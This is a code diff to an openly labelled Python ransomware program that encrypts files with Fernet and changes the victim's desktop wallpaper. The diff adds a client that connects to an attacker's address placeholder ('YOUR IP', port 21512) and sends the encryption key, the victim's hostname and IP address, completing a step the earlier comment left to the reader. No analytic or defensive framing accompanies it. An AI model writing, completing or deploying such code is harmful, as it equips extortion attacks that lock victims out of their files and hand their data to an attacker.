@@ -1,10 +1,13 @@
 import os
 import requests
 import ctypes
+import socket
 from cryptography.fernet import Fernet
 from threading import Thread
 
 desktop = os.path.expanduser('~/Desktop')
+host_name = socket.gethostname()
+ip_address = socket.gethostbyname(host_name)
 
 class Ransomware:
     def __init__(self):
@@ -33,5 +36,16 @@ class Ransomware:
             img.write(my_wallpaper.content)
         ctypes.windll.user32.SystemParametersInfoA(20, 0, os.path.join(desktop, 'wallpaper.jpg') , 0) 
 
-Ransomware()
-# Find a way to save the key, in order to decrypt the files. (Maybe setup a server, Its now your work.)
+class Client(Ransomware):
+    def __init__(self):
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as self.sock:
+            self.sock.connect(('YOUR IP', 21512))
+            Ransomware()
+            self.send_info()
+
+    def send_info(self):
+        self.sock.send(self.key)
+        self.sock.send(host_name)
+        self.sock.send(ip_address)
+
+Client()
